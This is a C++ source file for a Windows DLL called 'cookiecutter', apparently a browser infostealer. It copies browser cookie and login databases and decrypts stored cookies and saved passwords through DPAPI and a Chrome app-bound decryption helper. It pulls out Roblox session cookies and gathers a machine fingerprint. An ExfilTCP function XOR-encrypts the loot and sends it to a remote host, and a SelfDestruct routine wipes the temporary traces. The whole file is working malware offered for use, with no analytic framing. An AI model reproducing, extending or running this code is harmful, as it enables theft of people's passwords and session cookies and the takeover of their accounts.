//=============================================================================
//  cookiecutter.cpp — Main DLL (clean, no debug)
//=============================================================================

#include "cookiecutter.h"
#include "sqlite_minimal.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <shlobj.h>
#include <sstream>
#include <fstream>
#include <filesystem>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shell32.lib")

namespace fs = std::filesystem;
using namespace sqlite_minimal;

namespace cookiecutter {
    static const uint8_t XOR_KEY[] = {0x63,0x6F,0x6F,0x6B,0x69,0x65,0x63,0x75,0x74,0x74,0x65,0x72,0x5F,0x4C,0x4F,0x21};
    static const size_t XOR_KEY_LEN = sizeof(XOR_KEY);
    void XorEncrypt(uint8_t* d, size_t n) { for(size_t i=0;i<n;i++) d[i]^=XOR_KEY[i%XOR_KEY_LEN]; }

    std::wstring GetTempDir() {
        wchar_t t[MAX_PATH]; GetTempPathW(MAX_PATH,t);
        std::wstring d=std::wstring(t)+L"cc_tmp\\";
        CreateDirectoryW(d.c_str(),nullptr); return d;
    }
    bool CopyFileToTemp(const std::wstring& s, std::wstring& o) {
        std::wstring fn=s.substr(s.rfind(L'\\')+1);
        std::wstring tp=GetTempDir()+L"cc_"+fn;
        if(CopyFileW(s.c_str(),tp.c_str(),FALSE)){SetFileAttributesW(tp.c_str(),FILE_ATTRIBUTE_NORMAL);o=tp;return true;}
        return false;
    }
    bool WriteToFile(const std::wstring& p, const void* d, size_t n) {
        HANDLE h=CreateFileW(p.c_str(),GENERIC_WRITE,0,nullptr,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,nullptr);
        if(h==INVALID_HANDLE_VALUE)return false; DWORD w; BOOL ok=WriteFile(h,d,(DWORD)n,&w,nullptr); CloseHandle(h);
        return ok&&w==n;
    }
    std::string w2n(const std::wstring& ws){std::string s;for(wchar_t wc:ws)if(wc<128)s+=(char)wc;return s;}
    
    bool DPADecrypt(const std::vector<uint8_t>& ct, std::vector<uint8_t>& pt) {
        if(ct.empty())return false;
        DATA_BLOB in={(DWORD)ct.size(),(BYTE*)ct.data()},out={0};
        if(!CryptUnprotectData(&in,nullptr,nullptr,nullptr,nullptr,CRYPTPROTECT_UI_FORBIDDEN,&out))return false;
        pt.assign(out.pbData,out.pbData+out.cbData); LocalFree(out.pbData); return true;
    }
    
    static std::string jesc(const std::string& s){
        std::string o; for(char c:s){switch(c){case'"':o+="\\\"";break;case'\\':o+="\\\\";break;case'\n':o+="\\n";break;case'\r':o+="\\r";break;case'\t':o+="\\t";break;default:o+=c;}} return o;
    }
    std::string CookieJson(const std::vector<CookieEntry>& cs){
        std::ostringstream ss; ss<<"{\"cookies\":[";
        for(size_t i=0;i<cs.size();i++){auto&c=cs[i];ss<<"{\"host\":\""<<jesc(c.host)<<"\",\"name\":\""<<jesc(c.name)<<"\",\"value\":\""<<jesc(c.value)<<"\",\"path\":\""<<jesc(c.path)<<"\",\"expiry\":"<<c.expiry<<",\"secure\":"<<(c.secure?"true":"false")<<",\"httpOnly\":"<<(c.httpOnly?"true":"false")<<",\"browser\":\""<<jesc(c.browser)<<"\"}";if(i<cs.size()-1)ss<<",";} ss<<"]}"; return ss.str();
    }
    std::string CredJson(const std::vector<CredentialEntry>& cs){
        std::ostringstream ss; ss<<"{\"credentials\":[";
        for(size_t i=0;i<cs.size();i++){auto&c=cs[i];ss<<"{\"url\":\""<<jesc(c.url)<<"\",\"username\":\""<<jesc(c.username)<<"\",\"password\":\""<<jesc(c.password)<<"\",\"browser\":\""<<jesc(c.browser)<<"\"}";if(i<cs.size()-1)ss<<",";} ss<<"]}"; return ss.str();
    }
    std::string Fingerprint(){
        std::ostringstream ss; char h[256]={},u[256]={}; DWORD sz=sizeof(h);
        GetComputerNameA(h,&sz); sz=sizeof(u); GetUserNameA(u,&sz);
        OSVERSIONINFOA os={sizeof(os)}; GetVersionExA(&os);
        std::string ips; ULONG bl=15000; std::vector<uint8_t> b(bl);
        auto* ad=(PIP_ADAPTER_ADDRESSES)b.data();
        if(GetAdaptersAddresses(AF_INET,GAA_FLAG_INCLUDE_PREFIX,nullptr,ad,&bl)==NO_ERROR)
            for(auto* a=ad;a;a=a->Next)for(auto* adr=a->FirstUnicastAddress;adr;adr=adr->Next)
                if(adr->Address.lpSockaddr->sa_family==AF_INET){char ip[INET_ADDRSTRLEN];inet_ntop(AF_INET,&((sockaddr_in*)adr->Address.lpSockaddr)->sin_addr,ip,sizeof(ip));if(!ips.empty())ips+=", ";ips+=ip;}
        ss<<"{\"hostname\":\""<<jesc(h)<<"\",\"username\":\""<<jesc(u)<<"\",\"os\":\"Windows "<<os.dwMajorVersion<<"."<<os.dwMinorVersion<<" build "<<os.dwBuildNumber<<"\",\"ips\":\""<<jesc(ips)<<"\",\"is_admin\":"<<(IsUserAnAdmin()?"true":"false")<<"}";
        return ss.str();
    }
}

// v20 helper (in chrome_v20.cpp)
bool ChromeV20Decrypt(const std::wstring&,const std::vector<uint8_t>&,std::vector<uint8_t>&);

// =========================================================================
//  Exports
// =========================================================================

extern "C" CC_API bool HarvestCookies(const wchar_t* out) {
    BrowserProfile buf[64]; int n=EnumerateBrowsers(buf,64);
    std::vector<CookieEntry> all;
    for(int i=0;i<n;i++){auto& bp=buf[i];if(bp.cookiePath.empty())continue;
        std::wstring tmp;if(!cookiecutter::CopyFileToTemp(bp.cookiePath,tmp))continue;
        Database db;if(!db.open(tmp)){DeleteFileW(tmp.c_str());continue;}
        const TableInfo* tab=db.getTable("cookies");if(!tab)tab=db.getTable("moz_cookies");
        if(!tab){DeleteFileW(tmp.c_str());continue;}
        auto rows=db.readTable(tab->name);DeleteFileW(tmp.c_str());
        for(auto& row:rows){
            auto* hc=Database::getColumn(row,tab->columns,"host_key");
            auto* nc=Database::getColumn(row,tab->columns,"name");
            auto* ec=Database::getColumn(row,tab->columns,"encrypted_value");
            if(!hc||!nc||!ec||Database::isNull(*ec))continue;
            CookieEntry ce;ce.host=Database::asText(*hc);ce.name=Database::asText(*nc);
            ce.browser=cookiecutter::w2n(bp.name);
            auto* pc=Database::getColumn(row,tab->columns,"path");ce.path=pc?Database::asText(*pc):"/";
            auto* xc=Database::getColumn(row,tab->columns,"expires_utc");ce.expiry=xc?Database::asInt(*xc):0;
            auto* sc=Database::getColumn(row,tab->columns,"is_secure");ce.secure=sc?(Database::asInt(*sc)!=0):false;
            auto* ic=Database::getColumn(row,tab->columns,"is_httponly");ce.httpOnly=ic?(Database::asInt(*ic)!=0):false;
            const auto& blob=Database::asBlob(*ec);if(blob.empty())continue;
            std::vector<uint8_t> ct(blob);
            bool hasPfx=(ct.size()>=4&&ct[0]=='v'&&ct[3]==0);
            std::vector<uint8_t> dec;
            // v20 app-bound
            if(bp.isChromium&&hasPfx&&!bp.localStatePath.empty()&&ChromeV20Decrypt(bp.localStatePath,blob,dec)){ce.value=std::string((const char*)dec.data(),dec.size());all.push_back(std::move(ce));continue;}
            // DPAPI fallback (strip prefix)
            if(hasPfx)ct.erase(ct.begin(),ct.begin()+4);
            if(cookiecutter::DPADecrypt(ct,dec)&&!dec.empty()){ce.value=std::string((const char*)dec.data(),dec.size());all.push_back(std::move(ce));}
        }
    }
    std::string js=cookiecutter::CookieJson(all);
    return cookiecutter::WriteToFile(out,js.data(),js.size());
}

extern "C" CC_API bool HarvestCredentials(const wchar_t* out) {
    BrowserProfile buf[64];int n=EnumerateBrowsers(buf,64);
    std::vector<CredentialEntry> all;
    for(int i=0;i<n;i++){auto& bp=buf[i];if(bp.loginDataPath.empty())continue;
        std::wstring tmp;if(!cookiecutter::CopyFileToTemp(bp.loginDataPath,tmp))continue;
        Database db;if(!db.open(tmp)){DeleteFileW(tmp.c_str());continue;}
        const TableInfo* tab=db.getTable("logins");if(!tab)tab=db.getTable("moz_logins");
        if(!tab){DeleteFileW(tmp.c_str());continue;}
        auto rows=db.readTable(tab->name);DeleteFileW(tmp.c_str());
        for(auto& row:rows){
            auto* uc=Database::getColumn(row,tab->columns,"origin_url");
            if(!uc)uc=Database::getColumn(row,tab->columns,"hostname");
            auto* un=Database::getColumn(row,tab->columns,"username_value");
            if(!un)un=Database::getColumn(row,tab->columns,"encrypted_username");
            auto* pc=Database::getColumn(row,tab->columns,"password_value");
            if(!pc)pc=Database::getColumn(row,tab->columns,"encrypted_password");
            if(!uc||!un||!pc)continue;
            CredentialEntry c;c.url=Database::asText(*uc);c.username=Database::asText(*un);c.browser=cookiecutter::w2n(bp.name);
            if(!Database::isNull(*pc)){const auto& blob=Database::asBlob(*pc);if(!blob.empty()){std::vector<uint8_t> ct(blob);if(ct.size()>=4&&ct[0]=='v'&&ct[3]==0)ct.erase(ct.begin(),ct.begin()+4);std::vector<uint8_t> d;if(cookiecutter::DPADecrypt(ct,d))c.password=std::string((const char*)d.data(),d.size());}}
            all.push_back(std::move(c));
        }
    }
    std::string js=cookiecutter::CredJson(all);
    return cookiecutter::WriteToFile(out,js.data(),js.size());
}

extern "C" CC_API bool HarvestRobloxCookie(char* out, size_t* sz) {
    if(!out||!sz||!*sz)return false;
    BrowserProfile buf[64];int n=EnumerateBrowsers(buf,64);
    for(int i=0;i<n;i++){auto& bp=buf[i];if(bp.cookiePath.empty())continue;
        std::wstring tmp;if(!cookiecutter::CopyFileToTemp(bp.cookiePath,tmp))continue;
        Database db;if(!db.open(tmp)){DeleteFileW(tmp.c_str());continue;}
        const TableInfo* tab=db.getTable("cookies");if(!tab)tab=db.getTable("moz_cookies");
        if(!tab){DeleteFileW(tmp.c_str());continue;}
        auto rows=db.readTable(tab->name,".roblox.com");DeleteFileW(tmp.c_str());
        for(auto& row:rows){auto* nc=Database::getColumn(row,tab->columns,"name");auto* ec=Database::getColumn(row,tab->columns,"encrypted_value");if(!nc||!ec||Database::asText(*nc)!=".ROBLOSECURITY"||Database::isNull(*ec))continue;
            const auto& blob=Database::asBlob(*ec);if(blob.empty())continue;
            std::vector<uint8_t> ct(blob);if(ct.size()>=4&&ct[0]=='v'&&ct[3]==0)ct.erase(ct.begin(),ct.begin()+4);
            std::vector<uint8_t> d;if(cookiecutter::DPADecrypt(ct,d)&&!d.empty()){std::string val((const char*)d.data(),d.size());size_t m=(std::min)(val.size(),*sz-1);memcpy(out,val.data(),m);out[m]=0;*sz=m;return true;}
        }
    }
    return false;
}

extern "C" CC_API bool GetFingerprint(char* out, size_t* sz) {
    if(!out||!sz||!*sz)return false;std::string fp=cookiecutter::Fingerprint();size_t m=(std::min)(fp.size(),*sz-1);memcpy(out,fp.data(),m);out[m]=0;*sz=m;return true;
}

extern "C" CC_API bool ExfilTCP(const char* host, int port, const char* payload) {
    if(!host||!payload)return false;WSADATA wsa;if(WSAStartup(MAKEWORD(2,2),&wsa))return false;
    SOCKET s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);if(s==INVALID_SOCKET){WSACleanup();return false;}
    int to=5000;setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,(const char*)&to,sizeof(to));setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,(const char*)&to,sizeof(to));
    sockaddr_in a={};a.sin_family=AF_INET;a.sin_port=htons((u_short)port);inet_pton(AF_INET,host,&a.sin_addr);
    if(connect(s,(sockaddr*)&a,sizeof(a))==SOCKET_ERROR){closesocket(s);WSACleanup();return false;}
    size_t len=strlen(payload);std::vector<uint8_t> enc(len+4);enc[0]=(len>>24)&0xFF;enc[1]=(len>>16)&0xFF;enc[2]=(len>>8)&0xFF;enc[3]=len&0xFF;memcpy(enc.data()+4,payload,len);
    cookiecutter::XorEncrypt(enc.data(),enc.size());size_t sent=0;
    while(sent<enc.size()){int r=send(s,(const char*)enc.data()+sent,(int)(enc.size()-sent),0);if(r<=0){closesocket(s);WSACleanup();return false;}sent+=r;}
    closesocket(s);WSACleanup();return true;
}

extern "C" CC_API void SelfDestruct() {
    std::wstring td=cookiecutter::GetTempDir();
    if(fs::exists(td)){for(auto& e:fs::directory_iterator(td)){HANDLE h=CreateFileW(e.path().c_str(),GENERIC_WRITE,0,nullptr,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,nullptr);if(h!=INVALID_HANDLE_VALUE){DWORD sz=GetFileSize(h,nullptr);if(sz>0&&sz<10*1024*1024){std::vector<uint8_t> z(sz);DWORD w;WriteFile(h,z.data(),sz,&w,nullptr);}CloseHandle(h);}DeleteFileW(e.path().c_str());}RemoveDirectoryW(td.c_str());}
}

extern "C" CC_API bool DPADecryptBlob(const uint8_t* ct, size_t ctl, uint8_t* pt, size_t* ptl) {
    if(!ct||!pt||!ptl)return false;std::vector<uint8_t> c(ct,ct+ctl),p;if(!cookiecutter::DPADecrypt(c,p))return false;if(p.size()>*ptl)return false;memcpy(pt,p.data(),p.size());*ptl=p.size();return true;
}

BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID){if(r==DLL_PROCESS_ATTACH)DisableThreadLibraryCalls(h);return TRUE;}
